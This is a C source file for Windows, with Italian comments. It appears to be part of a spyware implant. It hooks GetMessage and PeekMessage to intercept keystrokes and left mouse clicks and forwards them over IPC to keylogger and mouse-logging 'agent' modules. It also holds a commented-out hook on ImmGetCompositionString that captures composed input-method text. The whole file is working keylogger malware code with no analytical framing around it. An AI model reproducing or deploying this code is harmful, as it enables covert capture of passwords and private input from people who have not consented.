#include <windows.h>
#include "Common.h"
#include "missing.h"
#include "Hooking.h"
#include "Keylog_Mouse.h"

// -------------------------------- GetMessage -----------------------------------
DEFAULT_SETUP_FUNC(H_GetMessage)
BOOL _stdcall H_GetMessageHook(void *data_param, 
							   LPMSG lpMsg,
							   HWND hwnd,
							   UINT wMsgFilterMin,
							   UINT wMsgFilterMax)									  									  
{
	MSG *rec_msg = NULL;
	key_params_struct key_params;

	INIT_WRAPPER(H_GetMessage, BOOL);
	CALL_ORIGINAL_API(lpMsg, hwnd, wMsgFilterMin, wMsgFilterMax);

	// Se fallisce ritorna...
	if (ret_code==-1 || !ret_code)
		return ret_code;
	
	// Per il keylogger
	IF_ACTIVE_AGENT(PM_KEYLOGAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_KEYDOWN || rec_msg->message == WM_KEYUP ||
			rec_msg->message == WM_SYSKEYDOWN || rec_msg->message == WM_SYSKEYUP ||
			rec_msg->message == WM_CHAR) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				IPC_CLIENT_WRITE(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
			}
	}

	// Per il mouse
	IF_ACTIVE_AGENT(PM_MOUSEAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_LBUTTONDOWN) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				IPC_CLIENT_WRITE(PM_MOUSEAGENT, (BYTE *)&key_params, sizeof(key_params), (DWORD)rec_msg->hwnd, IPC_DEF_PRIORITY);
			}
	}

	return ret_code;
}


// -------------------------------- PeekMessage -----------------------------------
DEFAULT_SETUP_FUNC(H_PeekMessage)
BOOL _stdcall H_PeekMessageHook(void *data_param, 
							    LPMSG lpMsg,
							    HWND hwnd,
							    UINT wMsgFilterMin,
							    UINT wMsgFilterMax,
							    UINT wRemoveMsg)									  
{
	MSG *rec_msg = NULL;
	key_params_struct key_params;

	INIT_WRAPPER(H_PeekMessage, BOOL);	
	CALL_ORIGINAL_API(lpMsg, hwnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);

	// Se fallisce o il messaggio non viene tolto dalla coda ritorna...
	if (!ret_code || wRemoveMsg!=PM_REMOVE)
		return ret_code;
	
	// Per il keylogger
	IF_ACTIVE_AGENT(PM_KEYLOGAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_KEYDOWN || rec_msg->message == WM_KEYUP ||
			rec_msg->message == WM_SYSKEYDOWN || rec_msg->message == WM_SYSKEYUP ||
			rec_msg->message == WM_CHAR) {

			key_params.msg = rec_msg->message;
			key_params.lprm = rec_msg->lParam;
			key_params.wprm = rec_msg->wParam;
			IPC_CLIENT_WRITE(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		}
	}

	// Per il mouse
	IF_ACTIVE_AGENT(PM_MOUSEAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_LBUTTONDOWN) {
			key_params.msg = rec_msg->message;
			key_params.lprm = rec_msg->lParam;
			key_params.wprm = rec_msg->wParam;
			IPC_CLIENT_WRITE(PM_MOUSEAGENT, (BYTE *)&key_params, sizeof(key_params), (DWORD)rec_msg->hwnd, IPC_DEF_PRIORITY);
		}
	}

	return ret_code;
}


// -------------------------------- ImmGetCompositionString -----------------------------------
/*DEFAULT_SETUP_FUNC(H_ImmGetCompositionString)
LONG _stdcall H_ImmGetCompositionStringHook(void *data_param,
											HIMC hIMC,
							 	            DWORD dwIndex,
								            LPVOID lpBuf,
								            DWORD dwBufLen)
									  
{
	key_params_struct key_params;
	WCHAR *composition_string;
	DWORD buf_len, i;

	INIT_WRAPPER(H_ImmGetCompositionString, LONG);	
	CALL_ORIGINAL_API(hIMC, dwIndex, lpBuf, dwBufLen);

	if (ret_code==IMM_ERROR_GENERAL || ret_code==IMM_ERROR_NODATA)
		return ret_code;

	// Considera solo il caso in cui abbia preso la stringa risultante
	if (dwIndex!=GCS_RESULTSTR || lpBuf==NULL)
		return ret_code;

	IF_ACTIVE_AGENT(PM_KEYLOGAGENT) {
		composition_string = (WCHAR *)lpBuf;
		buf_len = ret_code/sizeof(WCHAR);

		// Cicla per tutti i record tornati
		for (i=0; i<buf_len; i++) {
			key_params.msg = WM_CHAR;
			key_params.lprm = 0;
			key_params.wprm = composition_string[i];
			IPC_CLIENT_WRITE(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		}
	}

	return ret_code;	
}*/